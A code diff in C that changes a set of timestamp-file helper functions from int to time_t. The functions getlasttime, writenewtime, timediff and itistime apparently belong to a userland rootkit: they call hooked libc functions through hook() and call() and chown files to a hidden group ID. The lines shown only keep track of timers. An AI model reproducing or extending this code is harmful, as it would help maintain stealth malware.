@@ -3,17 +3,17 @@
     & behaving appropriately.. at the moment these are only 'CLEANEDTIME_PATH' & 'GIDTIME_PATH'.
 */
 
-int getlasttime(const char *timepath){
+time_t getlasttime(const char *timepath){
     if(rknomore()) return time(NULL);
 
-    int currentlast;
+    time_t currentlast;
     FILE *fp;
     char timbuf[64];
 
     hook(CFOPEN);
     fp = call(CFOPEN, timepath, "r");
     if(fp == NULL && errno == ENOENT){
-        int curtime = time(NULL);
+        time_t curtime = time(NULL);
         writenewtime(timepath, curtime);
         return curtime;
     }else if(fp == NULL) return -1;
@@ -21,11 +21,11 @@ int getlasttime(const char *timepath){
     fclose(fp);
 
     chown_path(timepath, readgid());
-    currentlast = atoi(timbuf);
+    currentlast = (time_t)atoi(timbuf);
     return currentlast;
 }
 
-int writenewtime(const char *timepath, int curtime){
+int writenewtime(const char *timepath, time_t curtime){
     if(rknomore()) return -1;
 
     FILE *fp;
@@ -35,7 +35,7 @@ int writenewtime(const char *timepath, int curtime){
     hook(CFOPEN, CFWRITE);
     fp = call(CFOPEN, timepath, "w");
     if(fp == NULL) return -1;
-    snprintf(timbuf, sizeof(timbuf)-1, "%d", curtime);
+    snprintf(timbuf, sizeof(timbuf)-1, "%ld", curtime);
     call(CFWRITE, timbuf, 1, strlen(timbuf), fp);
     fclose(fp);
 
@@ -43,13 +43,13 @@ int writenewtime(const char *timepath, int curtime){
     return 1;
 }
 
-int timediff(const char *timepath, int curtime){
-    int lasttime = getlasttime(timepath);
-    int diff = curtime - lasttime;
+time_t timediff(const char *timepath, time_t curtime){
+    time_t lasttime = getlasttime(timepath),
+           diff = curtime - lasttime;
     return diff;
 }
 
-int itistime(const char *timepath, int curtime, int timer){
+int itistime(const char *timepath, time_t curtime, time_t timer){
     if(notuser(0) || rknomore())
         return 0;
 
